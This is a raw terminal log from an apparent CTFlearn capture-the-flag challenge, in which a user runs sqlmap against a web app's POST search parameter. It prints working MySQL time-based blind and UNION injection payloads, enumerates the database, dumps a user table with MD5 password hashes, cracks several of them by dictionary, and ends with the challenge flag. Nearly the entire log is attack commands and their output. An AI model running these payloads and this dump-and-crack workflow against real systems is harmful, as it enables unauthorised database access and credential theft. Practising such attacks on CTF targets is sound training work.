 ___ ___[.]_____ ___ ___  {1.3.12.28#dev}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:29:57 /2019-12-21/

[23:29:57] [INFO] resuming back-end DBMS 'mysql' 
[23:29:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=Flagbrown' AND (SELECT 7469 FROM (SELECT(SLEEP(5)))FJrP) AND 'jUWT'='jUWT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Flagbrown' UNION ALL SELECT CONCAT(0x71716a7071,0x56474d4470754e6849515652646d6f416b467653576b676d7149445047656673765977536a6a6866,0x71766a7671),NULL,NULL-- gHTa
---
[23:29:58] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[23:29:58] [INFO] fetching tables for database: 'preshashbrown'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[23:30:01] [WARNING] reflective value(s) found and filtering out
[23:30:01] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[23:30:02] [WARNING] the SQL query provided does not return any output
[23:30:02] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[23:30:02] [INFO] fetching number of tables for database 'preshashbrown'
[23:30:02] [WARNING] time-based comparison requires larger statistical model, please wait.......................... (done)
[23:30:14] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses [23:30:38] [ERROR] user quit 

[*] ending @ 23:30:38 /2019-12-21/

omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJydjktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlMHSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --dump -D preshashbrown -T users
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.12.28#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:31:02 /2019-12-21/

[23:31:02] [INFO] resuming back-end DBMS 'mysql' 
[23:31:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=Flagbrown' AND (SELECT 7469 FROM (SELECT(SLEEP(5)))FJrP) AND 'jUWT'='jUWT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Flagbrown' UNION ALL SELECT CONCAT(0x71716a7071,0x56474d4470754e6849515652646d6f416b467653576b676d7149445047656673765977536a6a6866,0x71766a7671),NULL,NULL-- gHTa
---
[23:31:03] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[23:31:03] [INFO] fetching columns for table 'users' in database 'preshashbrown'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[23:31:04] [WARNING] reflective value(s) found and filtering out
[23:31:04] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[23:31:05] [WARNING] the SQL query provided does not return any output
[23:31:05] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[23:31:05] [WARNING] unable to retrieve column names for table 'users' in database 'preshashbrown'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/home/omri/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev/data/txt/common-columns.txt' (press Enter)
[2] custom
> 
[23:31:17] [ERROR] user quit

[*] ending @ 23:31:17 /2019-12-21/

omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJydjktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlMHSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --columns -D preshashbrown -T users
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.3.12.28#dev}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:31:24 /2019-12-21/

[23:31:24] [INFO] resuming back-end DBMS 'mysql' 
[23:31:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=Flagbrown' AND (SELECT 7469 FROM (SELECT(SLEEP(5)))FJrP) AND 'jUWT'='jUWT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Flagbrown' UNION ALL SELECT CONCAT(0x71716a7071,0x56474d4470754e6849515652646d6f416b467653576b676d7149445047656673765977536a6a6866,0x71766a7671),NULL,NULL-- gHTa
---
[23:31:25] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[23:31:25] [INFO] fetching columns for table 'users' in database 'preshashbrown'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[23:31:26] [WARNING] reflective value(s) found and filtering out
[23:31:26] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[23:31:26] [WARNING] unable to retrieve column names for table 'users' in database 'preshashbrown'
do you want to use common column existence check? [y/N/q] N
[23:31:31] [INFO] fetched data logged to text files under '/home/omri/.sqlmap/output/138.197.193.132'

[*] ending @ 23:31:31 /2019-12-21/

omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJydjktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlMHSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --columns -D preshashbrown -T users
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3.12.28#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:31:33 /2019-12-21/

[23:31:33] [INFO] resuming back-end DBMS 'mysql' 
[23:31:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=Flagbrown' AND (SELECT 7469 FROM (SELECT(SLEEP(5)))FJrP) AND 'jUWT'='jUWT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Flagbrown' UNION ALL SELECT CONCAT(0x71716a7071,0x56474d4470754e6849515652646d6f416b467653576b676d7149445047656673765977536a6a6866,0x71766a7671),NULL,NULL-- gHTa
---
[23:31:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[23:31:34] [INFO] fetching columns for table 'users' in database 'preshashbrown'
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[23:31:35] [WARNING] reflective value(s) found and filtering out
[23:31:35] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[23:31:35] [WARNING] unable to retrieve column names for table 'users' in database 'preshashbrown'
do you want to use common column existence check? [y/N/q] y
[23:31:36] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/home/omri/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev/data/txt/common-columns.txt' (press Enter)
[2] custom
> 
[23:31:38] [INFO] checking column existence using items from '/home/omri/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev/data/txt/common-columns.txt'
[23:31:38] [INFO] adding words used on web page to the check list
4
[23:31:42] [INFO] starting 4 threads
[23:48:24] [INFO] tried 2570/2605 items (99%)
[23:48:54] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[23:48:54] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
                                                                       
[23:49:08] [WARNING] no column(s) found
[23:49:08] [INFO] fetched data logged to text files under '/home/omri/.sqlmap/output/138.197.193.132'

[*] ending @ 23:49:08 /2019-12-21/

omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ less /home/omri/.sqlmap/output/138.197.193.132/
/home/omri/.sqlmap/output/138.197.193.132/ is a directory
omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ cd /home/omri/.sqlmap/output/138.197.193.132/
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132$ ls
dump  log  session.sqlite  target.txt
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132$ cd dump/
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132/dump$ ls
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132/dump$ less loglog: No such file or directory
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132/dump$ less loglog: No such file or directory
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132/dump$ less loglog: No such file or directory
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132/dump$ ls
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132/dump$ cd ..
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132$ ls
dump  log  session.sqlite  target.txt
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132$ less log
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132$ 
omri@omri-Latitude-E7240:~/.sqlmap/output/138.197.193.132$ cd ~
omri@omri-Latitude-E7240:~$ cd ctflearn/
omri@omri-Latitude-E7240:~/ctflearn$ cd 
AGT/                    Reverse Dis/
Bite-code/              rsa begginer/
cryptoversing/          rsanoob/
Event-HolidayHack/      so many 64s/
.git/                   the simpsons/
gitisgood/              Time to eat/
imgs/                   viginer cipher/
Jumper/                 xor is friend not food/
old memories/           
omri@omri-Latitude-E7240:~/ctflearn$ cd Event-HolidayHack/
Exclusive-Santa/   prehashbrown/      RockPaperScissors/
omri@omri-Latitude-E7240:~/ctflearn$ cd Event-HolidayHack/prehashbrown/
omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown$ ls
sqlmap-dev
omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown$ cd sqlmap-dev/
omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ ls
COMMITMENT  extra    plugins       sqlmap.conf  thirdparty
data        lib      README.md     sqlmap.py
doc         LICENSE  sqlmapapi.py  tamper
omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJydjktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlMHSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --dbms mysql -D prehashbrown --columns
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.12.28#dev}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:59:31 /2019-12-21/

[23:59:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=Flagbrown' AND (SELECT 7469 FROM (SELECT(SLEEP(5)))FJrP) AND 'jUWT'='jUWT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Flagbrown' UNION ALL SELECT CONCAT(0x71716a7071,0x56474d4470754e6849515652646d6f416b467653576b676d7149445047656673765977536a6a6866,0x71766a7671),NULL,NULL-- gHTa
---
[23:59:32] [INFO] testing MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[23:59:33] [WARNING] reflective value(s) found and filtering out
[23:59:33] [INFO] confirming MySQL
[23:59:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[23:59:34] [INFO] fetching tables for database: 'prehashbrown'
[23:59:35] [INFO] fetching columns for table 'hashbrown' in database 'prehashbrown'
[23:59:35] [INFO] fetching columns for table 'user' in database 'prehashbrown'
Database: prehashbrown
Table: hashbrown
[4 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| description | varchar(200) |
| id          | int(11)      |
| name        | varchar(40)  |
| special     | tinyint(1)   |
+-------------+--------------+

Database: prehashbrown
Table: user
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| admin    | tinyint(1)   |
| id       | int(11)      |
| password | varchar(120) |
| username | varchar(80)  |
+----------+--------------+

[23:59:35] [INFO] fetched data logged to text files under '/home/omri/.sqlmap/output/138.197.193.132'

[*] ending @ 23:59:35 /2019-12-21/

omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ python3 sqlmap.py -u http://138.197.193.132:5000/ --data "search=Flagbrown" -p "search" --method POST --cookie="session=.eJydjktuwzAMRK8icG0EMiVLsk_RfREU4i824DaF5ayC3D0CeoOuSGI4b-YJX7bXtmqD5fMJ7uwDvrW1elMY4GPX2tTt95vbftx5d5W5i-5ct-Z--88Frq_hn77r0MMPbSss5_HQfm0CCxAHwSIWcKreiDVkKoicfKF5jlaQaqWMGjNnTHkmZtHCmE2V0Guyvgt64eJx5M5ipGlMHSjmcw5RxpjqbBRtqpGkUgxBUla1WLjXfzQ9_sqEAq83sqVaWw.Xf6J-Q.N1xHHpXAavYCRaLu8PkKOkARPr0" --dbms mysql --dump -D prehashbrown -T user
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.12.28#dev}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:01:35 /2019-12-22/

[00:01:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=Flagbrown' AND (SELECT 7469 FROM (SELECT(SLEEP(5)))FJrP) AND 'jUWT'='jUWT

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=Flagbrown' UNION ALL SELECT CONCAT(0x71716a7071,0x56474d4470754e6849515652646d6f416b467653576b676d7149445047656673765977536a6a6866,0x71766a7671),NULL,NULL-- gHTa
---
[00:01:36] [INFO] testing MySQL
[00:01:36] [INFO] confirming MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
[00:01:37] [WARNING] reflective value(s) found and filtering out
[00:01:37] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[00:01:37] [INFO] fetching columns for table 'user' in database 'prehashbrown'
[00:01:37] [INFO] fetching entries for table 'user' in database 'prehashbrown'
[00:01:38] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[00:01:43] [INFO] writing hashes to a temporary file '/tmp/sqlmap6f3hgf1e31840/sqlmaphashes-k3nr4wd8.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[00:01:48] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/home/omri/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[00:01:50] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[00:01:56] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[00:01:56] [INFO] starting 4 processes 
[00:01:57] [INFO] cracked password '123' for user 'administrator'      
[00:01:57] [INFO] cracked password '123123' for user 'eladbeber619'    
[00:02:04] [INFO] cracked password 'hhh' for user 'ggggg'              
[00:02:05] [INFO] cracked password 'jowls' for user 'jowls'            
[00:02:06] [INFO] cracked password '' or 1=1--' for user '' or 1=1--'  
[00:02:09] [INFO] cracked password '' or 1=1--' for user '' or 1=1--'  
[00:02:10] [INFO] cracked password 'jowls' for user 'jowls'            
Database: prehashbrown                                                 
Table: user
[7 entries]
+----+-------+-----------------------------------------------+---------------+
| id | admin | password                                      | username      |
+----+-------+-----------------------------------------------+---------------+
| 2  | 1     | 32E0C348B4A5BB41DB683BC5690B546F              | admin         |
| 3  | 0     | c5caa67d534c59d1db8a586a10c08157 (jowls)      | jowls         |
| 4  | 0     | a3aca2964e72000eea4c56cb341002a4 (hhh)        | ggggg         |
| 5  | 0     | 4297f44b13955235245b2497399d7a93 (123123)     | eladbeber619  |
| 6  | 0     | 8ce3f2de6a1e527b7e2b0c81807743e9 (' or 1=1--) | ' or 1=1--    |
| 7  | 0     | 202cb962ac59075b964b07152d234b70 (123)        | administrator |
| 8  | 0     | 4297f44b13955235245b2497399d7a93 (123123)     | salazar236    |
+----+-------+-----------------------------------------------+---------------+

[00:02:11] [INFO] table 'prehashbrown.`user`' dumped to CSV file '/home/omri/.sqlmap/output/138.197.193.132/dump/prehashbrown/user.csv'
[00:02:11] [INFO] fetched data logged to text files under '/home/omri/.sqlmap/output/138.197.193.132'

[*] ending @ 00:02:11 /2019-12-22/
omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ This hashbrown is special, here is your flag: CTFlearn{h4shbr0wns_0n_th3_s3rv3r_@!#$<>[]}
This hashbrown is special, here is your flag: CTFlearn{h4shbr0wns_0n_th3_s3rv3r_@CTFlearn{h4shbr0wns_0n_th3_s3rv3r_@<>[]}
This: command not found
omri@omri-Latitude-E7240:~/ctflearn/Event-HolidayHack/prehashbrown/sqlmap-dev$ 

